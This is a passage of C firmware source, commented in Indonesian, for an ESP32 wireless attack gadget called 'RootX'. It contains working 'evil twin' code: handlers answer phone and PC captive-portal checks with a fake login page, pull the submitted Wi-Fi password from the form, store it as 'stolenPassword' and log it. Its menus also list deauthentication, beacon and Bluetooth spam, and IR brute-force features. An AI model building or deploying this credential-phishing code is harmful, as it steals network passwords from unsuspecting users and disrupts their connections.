    if (evilTwinState == 1) {
        /* Serve captive portal saat evil twin aktif */
        httpd_resp_sendstr_chunk(req, EVIL_TWIN_HTML);
        httpd_resp_sendstr_chunk(req, NULL);
    } else {
        httpd_resp_sendstr_chunk(req, HTML_HEAD);
        httpd_resp_sendstr_chunk(req, HTML_SCRIPT);
        httpd_resp_sendstr_chunk(req, NULL);
    }
    return ESP_OK;
}

/* GET /api/state */
static esp_err_t handler_state(httpd_req_t *req) {
    build_state_json();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");
    httpd_resp_send(req, state_buf, (int)strlen(state_buf));
    return ESP_OK;
}

/* POST /api/cmd */
static esp_err_t handler_cmd(httpd_req_t *req) {
    char buf[512] = {0};
    int recv = httpd_req_recv(req, buf, sizeof(buf)-1);
    if (recv > 0) { buf[recv] = '\0'; handle_cmd(buf); }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

/* POST /login  – evil twin password capture */
static esp_err_t handler_login(httpd_req_t *req) {
    char buf[256] = {0};
    int recv = httpd_req_recv(req, buf, sizeof(buf)-1);
    if (recv > 0) {
        buf[recv] = '\0';
        /* Parse "pw=VALUE" dari form POST body */
        char *pw = strstr(buf, "pw=");
        if (pw) {
            pw += 3;
            char *end = strchr(pw, '&');
            if (end) *end = '\0';
            strncpy(stolenPassword, pw, sizeof(stolenPassword)-1);
            stolenPassword[sizeof(stolenPassword)-1] = '\0';
            evilTwinState = 2;  /* berhasil! */
            isEvilTwin = false;
            ESP_LOGI(TAG, "Evil Twin berhasil! Password: %s", stolenPassword);
        }
    }
    /* Redirect ke halaman konfirmasi */
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "/");
    httpd_resp_sendstr(req, "");
    return ESP_OK;
}

/* Captive portal redirect untuk Android/iOS */
static esp_err_t handler_captive(httpd_req_t *req) {
    if (evilTwinState == 1) {
        httpd_resp_set_type(req, "text/html");
        httpd_resp_sendstr(req, EVIL_TWIN_HTML);
    } else {
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/");
        httpd_resp_sendstr(req, "");
    }
    return ESP_OK;
}

/* ============================================================
 * HTTP SERVER START / STOP
 * ============================================================ */
void start_webui_server(void) {
    if (webui_server != NULL) return;   /* sudah jalan */

    httpd_config_t cfg = HTTPD_DEFAULT_CONFIG();
    cfg.max_uri_handlers = 10;
    cfg.stack_size        = 8192;

    if (httpd_start(&webui_server, &cfg) != ESP_OK) {
        ESP_LOGW(TAG, "httpd_start gagal – mungkin port 80 sudah dipakai");
        return;
    }

    const httpd_uri_t uris[] = {
        { .uri="/",                    .method=HTTP_GET,  .handler=handler_root    },
        { .uri="/api/state",           .method=HTTP_GET,  .handler=handler_state   },
        { .uri="/api/cmd",             .method=HTTP_POST, .handler=handler_cmd     },
        { .uri="/login",               .method=HTTP_POST, .handler=handler_login   },
        { .uri="/generate_204",        .method=HTTP_GET,  .handler=handler_captive },
        { .uri="/hotspot-detect.html", .method=HTTP_GET,  .handler=handler_captive },
        { .uri="/ncsi.txt",            .method=HTTP_GET,  .handler=handler_captive },
        { .uri="/connecttest.txt",     .method=HTTP_GET,  .handler=handler_captive },
    };
    for (int i = 0; i < (int)(sizeof(uris)/sizeof(uris[0])); i++)
        httpd_register_uri_handler(webui_server, &uris[i]);

    ESP_LOGI(TAG, "Web UI server started – http://192.168.4.1");
}

void stop_webui_server(void) {
    if (webui_server == NULL) return;
    httpd_stop(webui_server);
    webui_server = NULL;
    ESP_LOGI(TAG, "Web UI server stopped");
}

/* ============================================================
 * WIFI AP SETUP
 * ============================================================ */
static void init_web_ap(void) {
    wifi_config_t ap_cfg = {
        .ap = {
            .ssid           = "RootX-AP",
            .ssid_len       = 8,
            .channel        = 6,
            .password       = "rootx1234",
            .max_connection = 4,
            .authmode       = WIFI_AUTH_WPA_WPA2_PSK,
        },
    };

    /* Pastikan mode APSTA supaya STA loopWiFi tetap bisa jalan */
    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
    esp_wifi_start();

    webApRunning = true;
    ESP_LOGI(TAG, "AP 'RootX-AP' aktif – password: rootx1234");
}

/* ============================================================
 * JOYSTICK INIT
 * ============================================================ */
void init_joystick(void) {
    const int pins[] = { PIN_UP, PIN_DOWN, PIN_LEFT, PIN_RIGHT, PIN_OK };
    for (int i = 0; i < 5; i++) {
        gpio_set_direction(pins[i], GPIO_MODE_INPUT);
        gpio_set_pull_mode(pins[i], GPIO_PULLUP_ONLY);
    }
}

/* ============================================================
 * UTILITY
 * ============================================================ */
uint32_t input_millis(void) { return (uint32_t)(esp_timer_get_time() / 1000); }
uint32_t millis(void)       { return (uint32_t)(esp_timer_get_time() / 1000); }
long map(long x, long in_min, long in_max, long out_min, long out_max) {
    return (x - in_min) * (out_max - out_min) / (in_max - in_min) + out_min;
}
int  getBounce(int speed, int range) { return 0; }
void apply_cyber_glitch(void)        { }
void drawLoadingBar(int x, int y, int w, int h, int p) { }
void drawIconScaled(int x, int y, int sw, int sh, int dw, int dh,
                    const uint8_t *icon, uint16_t color) { }
void drawSmartSelection(int targetY)         { }
void updateCarouselAnimation(void)           { }
void drawCarouselAnimated(float progress)    { }

/* ============================================================
 * ST7789 STUB WRAPPERS  (signature dipertahankan, isi kosong)
 * ============================================================ */
void rootx_print_text_c(int x,int y,const char*s,uint16_t f,uint16_t b)     { }
void rootx_print_text_cb(int x,int y,const char*s,uint16_t f,uint16_t b)    { }
void rootx_print_text_kecil(int x,int y,const char*s,uint16_t f,uint16_t b) { }
void rootx_print_text_sedang(int x,int y,const char*s,uint16_t f,uint16_t b){ }
void rootx_print_text_gede(int x,int y,const char*s,uint16_t f,uint16_t b)  { }
void setOledBrightness(uint8_t level)        { }
void drawBackground(void)                    { }

/* ============================================================
 * SCREEN STUBS  –  semua diganti web, fungsi ini jadi no-op
 * ============================================================ */
bool introDone = false;

void tampilkanMenuLogo(void)      { }
void tampilkanMenuUtama(void)     { }
void tampilkanWifiScanner(void)   { }
void tampilkanDeauthScreen(void)  { }
void tampilkanBrightness(void)    { }
void tampilkanSpamScreen(const char *judul, const char *subTeks) { }
void tampilkanStationScanner(void){ }
void tampilkanTrackScreen(void)   { }
void tampilkandeauthsta(void)     { }
void tampilkanEvilTwinScreen(void){ }
void tampilkanMenuIR(void)        { }
void tampilkanMenuSavedIR(void)   { }
void renderAboutScreen(void)      { }
void renderRebootScreen(void)     { }
void renderSdManager(void)        { }
void renderFileExplorer(void)     { }
void renderTvBGone(void)          { }

/* ============================================================
 * DATA ARRAYS  (tetap ada, dipakai input_system & lainnya)
 * ============================================================ */
const unsigned char *iconListWiFi[] = { ics_scan, ics_sniff, ics_spam, ics_wifi };
const unsigned char *iconListBLE[]  = { ics_scan, ics_apple, ics_android };
const unsigned char *iconListIR[]   = { ics_ir, ics_tv, ics_ac, ics_lock, ics_saved };
const unsigned char *iconListSet[]  = { ics_bright, ics_file, ics_info, ics_repeat };
const unsigned char *iconListGame[] = { ics_game, ics_game, ics_game };

const char *subMenuWiFi[] = { "Scan WiFi","List Scan","Beacon Spam","RickRoll SSID" };
const char *subMenuBLE[]  = { "BLE Scanner","Spam Apple","Spam Android" };
const char *subMenuIR[]   = { "Read Signal","TV B-Gone","AC Remote","Brute Force","Saved Remotes" };
const char *subMenuSet[]  = { "Brightness","SD Manager","About RootX","Reboot" };
const char *subMenuGame[] = { "Dinosaur Game","Snake Game","Tetris Game" };

MenuItem menuList[5] = {
    { wifi48,     wifi32,     "WI-FI" },
    { ble48,      ble32,      "BLE"   },
    { infrared48, infrared32, "IR"    },
    { setting48,  setting32,  "SETS"  },
    { game48,     game32,     "GAME"  },
};

int      carouselCurrentIdx  = 0;
int      carouselAnimFrame   = 0;
bool     carouselAnimating   = false;
uint32_t carouselAnimStart   = 0;
int      carouselDirection   = 0;

/* ============================================================
 * IR SAVED REMOTE STATE
 * ============================================================ */
ir_saved_state_t currentIRSavedState = IR_SAVED_STATE_LIST;
SavedRemote_t    listSavedRemotes[20];
int              totalSavedRemotes = 0;
int              savedRemoteIndex  = 0;
int              actionMenuIndex   = 0;

void loadSavedRemotes(void) {
    totalSavedRemotes = 0;
    FILE *f = fopen("/sdcard/ir_log.txt", "r");
    if (!f) return;
    char line[1500];
    while (fgets(line, sizeof(line), f) && totalSavedRemotes < 20) {
        char *t = strtok(line, "|");
        if (!t) continue;
        strcpy(listSavedRemotes[totalSavedRemotes].nama, t);
        t = strtok(NULL, "|"); if (!t) continue;
        listSavedRemotes[totalSavedRemotes].num_pulses = atoi(t);
        t = strtok(NULL, "|");
        char *pt = strtok(t, ","); int idx = 0;
        while (pt && idx < 200) {
            listSavedRemotes[totalSavedRemotes].pulses[idx++] = (uint16_t)atoi(pt);
            pt = strtok(NULL, ",");
        }
        totalSavedRemotes++;
    }
    fclose(f);
}

/* ============================================================
 * SD / FILE EXPLORER STATE
 * ============================================================ */
/* sdActionIdx & sdState sudah dideklarasi di atas */
char sdFileNames[MAX_FILES][32];
int  sdTotalFiles  = 0;
int  sdFileCursor  = 0;
int  sdFileScroll  = 0;
int  sdFileState   = 0;
bool isFileExpInit = false;
char currentPath[256] = "/sdcard";

/* ============================================================
 * TV-B-GONE STATE
 * ============================================================ */
int tvbgoneState    = 0;
int tvbgoneMenuIdx  = 0;
int tvbgoneProgress = 0;
int tvbgoneTotal    = 0;

/* ============================================================
 * TASK DISPLAY  –  entry point utama
 * ============================================================ */
void task_display(void *pvParameters) {
    init_joystick();

    /* Tunggu loopWiFi selesai inisialisasi WiFi (nvs, netif, esp_wifi_init) */
    vTaskDelay(pdMS_TO_TICKS(1500));

    /* Setup AP  (loopWiFi sudah panggil esp_netif_create_default_wifi_ap()) */
    init_web_ap();

    /* Start web server */
    start_webui_server();

    introDone = true;

    ESP_LOGI(TAG, "================================================");
    ESP_LOGI(TAG, "  RootX Web UI SIAP!");
    ESP_LOGI(TAG, "  Sambung ke WiFi : RootX-AP");
    ESP_LOGI(TAG, "  Password        : rootx1234");
    ESP_LOGI(TAG, "  Buka browser    : http://192.168.4.1");
    ESP_LOGI(TAG, "================================================");

    for (;;) {
        handleJoystick();   /* joystick fisik tetap jalan kalau ada */

        /* Kalau server mati (Evil Twin selesai), restart */
        if (webui_server == NULL && !isEvilTwin && evilTwinState != 1) {
            vTaskDelay(pdMS_TO_TICKS(500));
            init_web_ap();
            start_webui_server();
        }

        vTaskDelay(pdMS_TO_TICKS(50));
    }
}
